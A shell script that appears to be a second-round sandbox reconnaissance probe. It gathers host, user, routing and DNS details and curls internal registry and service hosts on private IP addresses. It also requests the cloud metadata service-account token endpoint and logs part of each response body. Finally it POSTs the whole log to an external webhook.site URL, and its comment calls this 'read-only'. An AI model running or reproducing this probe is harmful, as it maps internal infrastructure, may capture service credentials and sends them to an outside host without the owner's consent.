#!/bin/sh
# i86808 (round 2): sharpen the internal-reachability verdict with curl rc/stderr +
# port 80/443 variants + positive control + metadata 403-vs-blocked control.
# Read-only by construction: getent + HTTP GET only.
S="https://webhook.site/7069e327-e98a-475a-ac1b-5a94e9c12667/i86808b-$(date +%s)-$(hostname 2>/dev/null)"
F="${TMPDIR:-/tmp}/.i86808b.ran"
[ -f "$F" ] && { echo "[probe] I86808B=skip"; exit 0; }
: > "$F" 2>/dev/null
d=$(mktemp -d "${TMPDIR:-/tmp}/.i86808b.XXXXXX" 2>/dev/null) || d="${TMPDIR:-/tmp}/.i86808b-$$"
mkdir -p "$d" 2>/dev/null || exit 0
o="$d/out"; : > "$o"
{
  echo "== I86808B META host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null) date=$(date -u +%FT%TZ 2>/dev/null) pwd=$(pwd 2>/dev/null)"
  echo "== CURL $(curl -V 2>/dev/null | head -1)"
  echo "== ROUTE $(ip route 2>/dev/null | head -5 | tr '\n' ';')"
  echo "== RESOLV $(cat /etc/resolv.conf 2>/dev/null | grep -v '^#' | tr '\n' ';')"
} >> "$o"

one() {
  N="$1"; SCH="$2"; P="$3"; HDR="$4"
  H=$(getent hosts "$N" 2>/dev/null | awk '{print $1}' | head -1)
  HA=$(getent ahosts "$N" 2>/dev/null | awk '{print $1}' | sort -u | tr '\n' ',' | head -c 60)
  : > "$d/h"; : > "$d/b"; : > "$d/e"
  if [ -n "$HDR" ]; then
    curl -sS -k --noproxy '*' --connect-timeout 3 -m 6 -H "$HDR" -D "$d/h" -o "$d/b" "$SCH://$N$P" >/dev/null 2>"$d/e"; RC=$?
  else
    curl -sS -k --noproxy '*' --connect-timeout 3 -m 6 -D "$d/h" -o "$d/b" "$SCH://$N$P" >/dev/null 2>"$d/e"; RC=$?
  fi
  C=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
  B=$(wc -c < "$d/b" 2>/dev/null | tr -d ' ')
  SH=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
  BD=$(head -c 160 "$d/b" 2>/dev/null | tr '\r\n\t' '   ')
  ER=$(head -c 110 "$d/e" 2>/dev/null | tr '\r\n\t' '   ')
  echo "$N|$P|dns=${H:-NXDOMAIN}|ahosts=${HA:-none}|http=${C:-none}|len=${B:-0}|sha16=${SH:-none}|rc=$RC|err=$ER|body=$BD" >> "$o"
  sleep 0.2
}

# positive control: prove the probe's curl reaches real public endpoints from this sandbox
one api.fireworks.ai                      https /healthz
# harbor (registry) - both schemes on the named host and on the raw RFC1918 IP
one harbor.us-iowa-1.fireworks-ai.cloud   https /v2/
one harbor.us-iowa-1.fireworks-ai.cloud   http  /v2/
one harbor.us-virginia-1.fireworks-ai.cloud https /v2/
one 10.247.189.245                        https /v2/
one 10.247.189.245                        http  /v2/
# temper
one temper.fireworks-ai.cloud             https /
one 10.1.255.22                           https /
one 10.1.255.22                           http  /
# gRPC frontends (reachability controls; expect 415)
one 34.110.152.11                         https /
one gateway.fireworks.ai                  https /
# metadata: header vs no-header distinguishes 403 (reachable) from blocked/timeout
one 169.254.169.254                       http  /computeMetadata/v1/instance/service-accounts/default/token 'Metadata-Flavor: Google'
one 169.254.169.254                       http  /computeMetadata/v1/instance/service-accounts/default/token
# DNS recheck for the internal-only names that came back NXDOMAIN in round 1
one pilot.fireworks-ai.cloud              https /
one langfuse.fireworks-ai.cloud           http  /api/public/health

echo "== I86808B DONE cells=$(grep -c '|' "$o")" >> "$o"
OK=0
curl -sS -m 25 --noproxy '*' -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
if [ "$OK" = 0 ]; then
  curl -sS -m 25 -X POST -H 'content-type: text/plain' --data-binary @"$o" "$S" >/dev/null 2>&1 && OK=1
fi
echo "[probe] I86808B=posted:$OK n=$(grep -c '|' "$o")"
